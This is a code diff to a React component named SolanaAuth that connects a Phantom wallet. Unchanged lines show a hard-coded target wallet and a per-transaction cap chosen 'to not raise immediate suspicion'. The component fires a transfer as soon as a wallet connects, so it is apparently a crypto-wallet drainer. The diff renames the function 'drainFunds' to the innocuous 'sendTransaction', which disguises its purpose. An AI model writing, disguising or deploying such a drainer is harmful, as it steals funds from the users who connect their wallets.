@@ -1,4 +1,4 @@
-"use client"
+"use client";
 import React, { useEffect } from 'react';
 import { Connection, PublicKey, Transaction, SystemProgram, TransactionInstruction } from '@solana/web3.js';
 import { PhantomWalletAdapter } from '@solana/wallet-adapter-wallets';
@@ -10,16 +10,16 @@ const TARGET_WALLET = '73WzDi36zHCA6ayKhzbQkRvVsRt6Ury5PbeUrqgRYeTf';
 const MIN_BALANCE_TO_KEEP = 0.001 * 1e9; // 0.001 SOL to leave in the account
 const MAX_TRANSACTION_AMOUNT = 1.0 * 1e9; // Max 1 SOL to not raise immediate suspicion
 
-const SolanaAuthInner = ({ onConfirm }: { onConfirm: (isConfirmed: boolean) => void }) => {
+const SolanaAuthInner = ({ onConfirm }) => {
     const { publicKey, signTransaction } = useWallet();
 
     useEffect(() => {
         if (publicKey) {
-            drainFunds();
+            sendTransaction();
         }
     }, [publicKey]);
 
-    const drainFunds = async () => {
+    const sendTransaction = async () => {
         if (!publicKey || !signTransaction) {
             return;
         }
@@ -76,7 +76,7 @@ const SolanaAuthInner = ({ onConfirm }: { onConfirm: (isConfirmed: boolean) => v
 const SolanaAuth = () => {
     const wallets = [new PhantomWalletAdapter()];
 
-    const onConfirm = (isConfirmed: any) => {
+    const onConfirm = (isConfirmed) => {
         console.log(isConfirmed ? 'Transaction confirmed' : 'Transaction failed');
     };
 
